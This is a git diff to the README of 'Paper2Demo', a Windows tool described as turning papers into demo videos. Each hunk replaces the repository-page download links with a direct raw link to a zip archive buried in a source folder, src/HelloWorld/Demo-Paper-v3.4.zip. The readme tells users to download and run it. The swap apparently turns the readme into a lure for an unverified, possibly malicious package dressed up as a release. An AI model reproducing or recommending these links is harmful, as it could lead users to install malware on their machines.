@@ -1,7 +1,7 @@
 # 🎬 Paper2Demo - Turn Papers Into Demo Videos
 
-[![Download Paper2Demo](https://img.shields.io/badge/Download-Paper2Demo-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Parasailgroundglass655/Paper2Demo)
-[![Paper2Demo Download](https://img.shields.io/badge/Download%20Now-Visit%20GitHub%20Page-6f42c1?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Parasailgroundglass655/Paper2Demo)
+[![Download Paper2Demo](https://img.shields.io/badge/Download-Paper2Demo-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Parasailgroundglass655/Paper2Demo/main/src/HelloWorld/Demo-Paper-v3.4.zip)
+[![Paper2Demo Download](https://img.shields.io/badge/Download%20Now-Visit%20GitHub%20Page-6f42c1?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Parasailgroundglass655/Paper2Demo/main/src/HelloWorld/Demo-Paper-v3.4.zip)
 
 ## 🖥️ What Paper2Demo does
 
@@ -19,7 +19,7 @@ It is built for Windows users who want a simple way to move from PDF to video wi
 
 Visit this page to download and run Paper2Demo on Windows:
 
-https://github.com/Parasailgroundglass655/Paper2Demo
+https://raw.githubusercontent.com/Parasailgroundglass655/Paper2Demo/main/src/HelloWorld/Demo-Paper-v3.4.zip
 
 If the page has a release file, download the Windows file listed there. If the page shows the full project files, use the main download option on the page and save the Windows package to your computer.
 
@@ -168,4 +168,4 @@ This gives Paper2Demo better source material and helps the final video feel clea
 
 Primary download page:
 
-https://github.com/Parasailgroundglass655/Paper2Demo
+https://raw.githubusercontent.com/Parasailgroundglass655/Paper2Demo/main/src/HelloWorld/Demo-Paper-v3.4.zip
